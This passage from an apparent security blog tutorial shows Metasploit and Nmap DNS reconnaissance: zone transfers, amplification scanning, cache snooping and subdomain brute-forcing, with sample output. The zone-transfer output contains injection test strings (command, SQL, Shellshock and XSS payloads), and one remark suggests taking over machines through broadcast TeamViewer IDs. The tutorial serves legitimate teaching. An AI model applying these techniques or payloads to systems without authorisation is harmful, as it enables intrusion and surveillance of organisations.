<li><strong>DNS Record Scanner and Enumerator</strong> : This module can be used to gather information about a domain from a given DNS server by performing various DNS queries such as zone transfers, reverse lookups, SRV record bruteforcing, and other techniques.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/enum_dns</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Setting DNS Server to zonetransfer.me NS: 81.4.xx.xx
</span><span class='line'>[*] Retrieving general DNS records
</span><span class='line'>[*] Domain: zonetransfer.me IP address: 217.147.xx.xx Record: A 
</span><span class='line'>[*] Name: ASPMX.L.GOOGLE.COM. Preference: 0 Record: MX
</span><span class='line'>[*] Name: ASPMX3.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ALT1.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
</span><span class='line'>[*] Name: ASPMX5.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ASPMX2.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ASPMX4.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ALT2.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
</span><span class='line'>[*] zonetransfer.me.        301     IN      TXT     
</span><span class='line'>[*] Text: zonetransfer.me.        301     IN      TXT     
</span><span class='line'>[*] Performing zone transfer against all nameservers in zonetransfer.me
</span><span class='line'>[*] Testing nameserver: nsztm2.digi.ninja.
</span><span class='line'>W, [2016-04-05T22:53:16.834590 #15019]  WARN -- : AXFR query, switching to TCP
</span><span class='line'>W, [2016-04-05T22:53:17.490698 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
</span><span class='line'>W, [2016-04-05T22:53:32.047468 #15019]  WARN -- : Nameserver 167.88.xx.xx not responding within TCP timeout, trying next one
</span><span class='line'>F, [2016-04-05T22:53:32.047746 #15019] FATAL -- : No response from nameservers list: aborting
</span><span class='line'>[-] Zone transfer failed (length was zero)
</span><span class='line'>[*] Testing nameserver: nsztm1.digi.ninja.
</span><span class='line'>W, [2016-04-05T22:53:33.269318 #15019]  WARN -- : AXFR query, switching to TCP
</span><span class='line'>W, [2016-04-05T22:53:33.804121 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
</span><span class='line'>W, [2016-04-05T22:53:48.481319 #15019]  WARN -- : Nameserver 81.4.xx.xx not responding within TCP timeout, trying next one
</span><span class='line'>F, [2016-04-05T22:53:48.481519 #15019] FATAL -- : No response from nameservers list: aborting
</span><span class='line'>[-] Zone transfer failed (length was zero)
</span><span class='line'>[*] Enumerating SRV records for zonetransfer.me
</span><span class='line'>[*] SRV Record: _sip._tcp.zonetransfer.me Host: www.zonetransfer.me. Port: 5060 Priority: 0
</span><span class='line'>[*] Done
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
Two interesting metasploit modules which we found are
<li>
<strong>DNS Amplification Scanner</strong> which tests for the DNS Amplification Tests.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/scanner/dns/dns_amp
</span><span class='line'>services -p 53 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Sending 67 bytes to each host using the IN ANY isc.org request
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 417 bytes [6.22x Amplification]
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 230 bytes [3.43x Amplification]</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>DNS Non-Recursive Record Scraper</strong> which can be used to scrape records that have been cached by a specific nameserver. Thinking of what all can be discovered from this module is the antivirus softwares used by the company, websites visited by the employees. It uses dns norecurse option.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_cache_scraper </span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Making queries against 103.8.xx.xx
</span><span class='line'>[+] dnl-01.geo.kaspersky.com - Found
</span><span class='line'>[+] downloads2.kaspersky-labs.com - Found
</span><span class='line'>[+] liveupdate.symantecliveupdate.com - Found
</span><span class='line'>[+] liveupdate.symantec.com - Found
</span><span class='line'>[+] update.symantec.com - Found
</span><span class='line'>[+] update.nai.com - Found
</span><span class='line'>[+] guru.avg.com - Found
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p><strong>Nmap</strong> has around 19-20 NSE Scripts for DNS, we haven&rsquo;t mentioned all the NSE here, only which we were able to use.:</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html">broadcast-dns-service-discovery.nse</a> Attempts to discover hosts' services using the DNS Service Discovery protocol. It sends a multicast DNS-SD query and collects all the responses.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> nmap --script=broadcast-dns-service-discovery
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-12 14:53 IST
</span><span class='line'>Pre-scan script results:
</span><span class='line'>| broadcast-dns-service-discovery: 
</span><span class='line'>|   172.30.xx.xx
</span><span class='line'>|     9/tcp workstation
</span><span class='line'>|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
</span><span class='line'>|     22/tcp udisks-ssh
</span><span class='line'>|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
</span><span class='line'>|   172.30.xx.xx
</span><span class='line'>|     2020/tcp teamviewer
</span><span class='line'>|       DyngateID=164005815
</span><span class='line'>|       Token=CrzebHH5rkzIEBsP
</span><span class='line'>|       UUID=119e36d8-4366-4495-9e13-c44be02851f0
</span><span class='line'>|_      Address=172.30.xx.xx fe80:0:0:0:69ab:44d5:e21d:738e
</span><span class='line'>WARNING: No targets were specified, so 0 hosts scanned.
</span><span class='line'>Nmap done: 0 IP addresses (0 hosts up) scanned in 7.24 seconds</span></code></pre></td></tr></table></div></figure>

It's surprising why teamviewer will broadcast it's ID, then we mostly need 4 digit pin just to control the machine.
</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-blacklist.html">dns-blacklist.nse</a> ( External IP Only ) Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists and returns a list of services for which an IP has been flagged</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-brute.html">dns-brute.nse</a>: This is similar to the msf dns_bruteforce module. Attempts to enumerate DNS hostnames by brute force guessing of common subdomains.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script dns-brute www.example.com -sn -n -Pn
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:23 IST
</span><span class='line'>Nmap scan report for www.example.com (116.50.xx.xx)
</span><span class='line'>Host is up.
</span><span class='line'>Other addresses for www.example.com (not scanned): 64:ff9b::7432:4fd0
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>| dns-brute: 
</span><span class='line'>|   DNS Brute-force hostnames: 
</span><span class='line'>|     mx1.example.com - 64:ff9b:0:0:0:0:cbc7:2989
</span><span class='line'>|     images.example.com - 116.50.xx.xx
</span><span class='line'>|     images.example.com - 64:ff9b:0:0:0:0:7432:404b
</span><span class='line'>|     dns.example.com - 116.50.xx.xx
</span><span class='line'>|     dns.example.com - 64:ff9b:0:0:0:0:7432:42e6
</span><span class='line'>|     web.example.com - 203.199.xx.xx
</span><span class='line'>|     web.example.com - 64:ff9b:0:0:0:0:cbc7:2911
</span><span class='line'>|     exchange.example.com - 203.199.xx.xx
</span><span class='line'>|     mail.example.com - 116.50.xx.xx
</span><span class='line'>|     exchange.example.com - 64:ff9b:0:0:0:0:cbc7:29a7
</span><span class='line'>|     mail.example.com - 64:ff9b:0:0:0:0:7432:4fe7
</span><span class='line'>|     blog.example.com - 116.50.xx.xx
</span><span class='line'>|     blog.example.com - 64:ff9b:0:0:0:0:7432:4ebb
</span><span class='line'>|     www.example.com - 116.50.xx.xx
</span><span class='line'>|     www.example.com - 64:ff9b:0:0:0:0:7432:4fd0
</span><span class='line'>|     sip.example.com - 116.50.xx.xx
</span><span class='line'>|     sip.example.com - 116.50.xx.xx
</span><span class='line'>|     sip.example.com - 64:ff9b:0:0:0:0:7432:4e56
</span><span class='line'>|     sip.example.com - 64:ff9b:0:0:0:0:7432:4ec9
</span><span class='line'>|     mobile.example.com - 116.50.xx.xx
</span><span class='line'>|_    mobile.example.com - 64:ff9b:0:0:0:0:7432:4e18
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-cache-snoop.html">dns-cache-snoop.nse</a> : This module is similar to dns_cache_scraper. Performs DNS cache snooping against a DNS server. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with "www." and once without. Use the dns-cache-snoop.domains script argument to use a different list.
<br>
<br>
Sample Output with no arguments:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 53 --script dns-cache-snoop.nse 103.8.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:30 IST
</span><span class='line'>Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
</span><span class='line'>Host is up (0.067s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/udp open  domain
</span><span class='line'>| dns-cache-snoop: 83 of 100 tested domains are cached.
</span><span class='line'>| google.com
</span><span class='line'>| www.google.com
</span><span class='line'>| facebook.com
</span><span class='line'>| www.facebook.com
</span><span class='line'>| youtube.com
</span><span class='line'>| www.youtube.com
</span><span class='line'>| yahoo.com
</span><span class='line'>| www.yahoo.com</span></code></pre></td></tr></table></div></figure>

Sample Output with custom list of websites:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={dnl-01.geo.kaspersky.com,update.symantec.com,host3.com}' 103.8.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:33 IST
</span><span class='line'>Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
</span><span class='line'>Host is up (0.11s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/udp open  domain
</span><span class='line'>| dns-cache-snoop: 2 of 3 tested domains are cached.
</span><span class='line'>| dnl-01.geo.kaspersky.com
</span><span class='line'>|_update.symantec.com</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-check-zone.html">dns-check-zone.nse</a> :  Checks DNS zone configuration against best practices, including RFC 1912. The configuration checks are divided into categories which each have a number of different tests.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sn -Pn aster.example.co.in --script dns-check-zone --script-args='dns-check-zone.domain=example.com'
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:33 IST
</span><span class='line'>Nmap scan report for aster.example.co.in (202.191.xx.xx)
</span><span class='line'>Host is up.
</span><span class='line'>Other addresses for aster.example.co.in (not scanned): 64:ff9b::cabf:9a42
</span><span class='line'>rDNS record for 202.191.xx.xx: segment-202-191.sify.net
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>| dns-check-zone: 
</span><span class='line'>| DNS check results for domain: example.com
</span><span class='line'>|   MX
</span><span class='line'>|     PASS - Reverse MX A records
</span><span class='line'>|       All MX records have PTR records
</span><span class='line'>|   SOA
</span><span class='line'>|     PASS - SOA REFRESH
</span><span class='line'>|       SOA REFRESH was within recommended range (3600s)
</span><span class='line'>|     PASS - SOA RETRY
</span><span class='line'>|       SOA RETRY was within recommended range (600s)
</span><span class='line'>|     PASS - SOA EXPIRE
</span><span class='line'>|       SOA EXPIRE was within recommended range (1209600s)
</span><span class='line'>|     PASS - SOA MNAME entry check
</span><span class='line'>|       SOA MNAME record is listed as DNS server
</span><span class='line'>|     PASS - Zone serial numbers
</span><span class='line'>|       Zone serials match
</span><span class='line'>|   NS
</span><span class='line'>|     FAIL - Recursive queries
</span><span class='line'>|       The following servers allow recursive queries: 45.33.xx.xx
</span><span class='line'>|     PASS - Multiple name servers
</span><span class='line'>|       Server has 2 name servers
</span><span class='line'>|     PASS - DNS name server IPs are public
</span><span class='line'>|       All DNS IPs were public
</span><span class='line'>|     PASS - DNS server response
</span><span class='line'>|       All servers respond to DNS queries
</span><span class='line'>|     PASS - Missing nameservers reported by parent
</span><span class='line'>|       All DNS servers match
</span><span class='line'>|     PASS - Missing nameservers reported by your nameservers
</span><span class='line'>|_      All DNS servers match
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-nsid.html">dns-nsid.nse</a>: Retrieves information from a DNS nameserver by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sSU -p 53 --script dns-nsid 202.191.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:37 IST
</span><span class='line'>Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
</span><span class='line'>Host is up (0.097s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/tcp open  domain
</span><span class='line'>53/udp open  domain
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.3.3rc2
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-recursion.html">dns-recursion.nse</a> : Checks if a DNS server allows queries for third-party names. It is expected that recursion will be enabled on your own internal nameservers.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 53 --script=dns-recursion 202.191.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:39 IST
</span><span class='line'>Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
</span><span class='line'>Host is up (0.094s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/udp open  domain
</span><span class='line'>|_dns-recursion: Recursion appears to be enabled
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-service-discovery.html">dns-service-discovery.nse</a> : Attempts to discover target hosts' services using the DNS Service Discovery protocol. The script first sends a query for _services._dns-sd._udp.local to get a list of services. It then sends a followup query for each one to try to get more information.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run
</span><span class='line'>nmap --script=dns-service-discovery -p 5353 &lt;target&gt;</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-srv-enum.html">dns-srv-enum.nse</a> : Enumerates various common service (SRV) records for a given domain name. The service records contain the hostname, port and priority of servers for a given service. The following services are enumerated by the script:
<ul>
<li>Active Directory Global Catalog</li>
<li>Exchange Autodiscovery</li>
<li>Kerberos KDC Service</li>
<li>Kerberos Passwd Change Service</li>
<li>LDAP Servers</li>
<li>SIP Servers</li>
<li>XMPP S2S</li>
<li>XMPP C2S</li>
</ul>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">dns-zone-transfer.nse</a> : Requests a zone transfer (AXFR) from a DNS server.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me nsztm2.digi.ninja
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:49 IST
</span><span class='line'>Nmap scan report for nsztm2.digi.ninja (167.88.xx.xx)
</span><span class='line'>Host is up (0.29s latency).
</span><span class='line'>Other addresses for nsztm2.digi.ninja (not scanned): 64:ff9b::a758:2a5e
</span><span class='line'>rDNS record for 167.88.xx.xx: zonetransfer.me
</span><span class='line'>Not shown: 996 closed ports
</span><span class='line'>PORT     STATE    SERVICE
</span><span class='line'>53/tcp   open     domain
</span><span class='line'>| dns-zone-transfer: 
</span><span class='line'>| zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
</span><span class='line'>| zonetransfer.me.                                HINFO  "Casio fx-700G" "Windows XP"
</span><span class='line'>| zonetransfer.me.                                TXT    "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
</span><span class='line'>| zonetransfer.me.                                MX     0 ASPMX.L.GOOGLE.COM.
</span><span class='line'>| zonetransfer.me.                                MX     10 ALT1.ASPMX.L.GOOGLE.COM.
</span><span class='line'>| zonetransfer.me.                                MX     10 ALT2.ASPMX.L.GOOGLE.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX2.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX3.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX4.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX5.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                A      217.147.xx.xx
</span><span class='line'>| zonetransfer.me.                                NS     nsztm1.digi.ninja.
</span><span class='line'>| zonetransfer.me.                                NS     nsztm2.digi.ninja.
</span><span class='line'>| _sip._tcp.zonetransfer.me.                      SRV    0 0 5060 www.zonetransfer.me.
</span><span class='line'>| 157.177.xx.xx.IN-ADDR.ARPA.zonetransfer.me.   PTR    www.zonetransfer.me.
</span><span class='line'>| asfdbauthdns.zonetransfer.me.                   AFSDB  1 asfdbbox.zonetransfer.me.
</span><span class='line'>| asfdbbox.zonetransfer.me.                       A      127.0.xx.xx
</span><span class='line'>| asfdbvolume.zonetransfer.me.                    AFSDB  1 asfdbbox.zonetransfer.me.
</span><span class='line'>| canberra-office.zonetransfer.me.                A      202.14.xx.xx
</span><span class='line'>| cmdexec.zonetransfer.me.                        TXT    "; ls"
</span><span class='line'>| contact.zonetransfer.me.                        TXT    "Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes"
</span><span class='line'>| dc-office.zonetransfer.me.                      A      143.228.xx.xx
</span><span class='line'>| deadbeef.zonetransfer.me.                       AAAA   dead:beaf::
</span><span class='line'>| dr.zonetransfer.me.                             LOC    53.349044 N 1.642646 W 0m 1.0m 10000.0m 10.0m
</span><span class='line'>| DZC.zonetransfer.me.                            TXT    "AbCdEfG"
</span><span class='line'>| email.zonetransfer.me.                          NAPTR  1 1 "P" "E2U+email" "" email.zonetransfer.me.zonetransfer.me.
</span><span class='line'>| email.zonetransfer.me.                          A      74.125.xx.xx
</span><span class='line'>| Info.zonetransfer.me.                           TXT    "ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information."
</span><span class='line'>| internal.zonetransfer.me.                       NS     intns1.zonetransfer.me.
</span><span class='line'>| internal.zonetransfer.me.                       NS     intns2.zonetransfer.me.
</span><span class='line'>| intns1.zonetransfer.me.                         A      167.88.xx.xx
</span><span class='line'>| intns2.zonetransfer.me.                         A      167.88.xx.xx
</span><span class='line'>| office.zonetransfer.me.                         A      4.23.xx.xx
</span><span class='line'>| ipv6actnow.org.zonetransfer.me.                 AAAA   2001:67c:2e8:11::c100:1332
</span><span class='line'>| owa.zonetransfer.me.                            A      207.46.xx.xx
</span><span class='line'>| robinwood.zonetransfer.me.                      TXT    "Robin Wood"
</span><span class='line'>| rp.zonetransfer.me.                             RP     robin.zonetransfer.me. robinwood.zonetransfer.me.
</span><span class='line'>| sip.zonetransfer.me.                            NAPTR  2 3 "P" "E2U+sip" "!^.*$!sip:customer-service@zonetransfer.me!" .
</span><span class='line'>| sqli.zonetransfer.me.                           TXT    "' or 1=1 --"
</span><span class='line'>| sshock.zonetransfer.me.                         TXT    "() { :]}; echo ShellShocked"
</span><span class='line'>| staging.zonetransfer.me.                        CNAME  www.sydneyoperahouse.com.
</span><span class='line'>| alltcpportsopen.firewall.test.zonetransfer.me.  A      127.0.xx.xx
</span><span class='line'>| testing.zonetransfer.me.                        CNAME  www.zonetransfer.me.
</span><span class='line'>| vpn.zonetransfer.me.                            A      174.36.xx.xx
</span><span class='line'>| www.zonetransfer.me.                            A      217.147.xx.xx
</span><span class='line'>| xss.zonetransfer.me.                            TXT    "'&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;"
</span><span class='line'>|_zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
</span><span class='line'>135/tcp  filtered msrpc
</span><span class='line'>445/tcp  filtered microsoft-ds
</span><span class='line'>8333/tcp filtered bitcoin
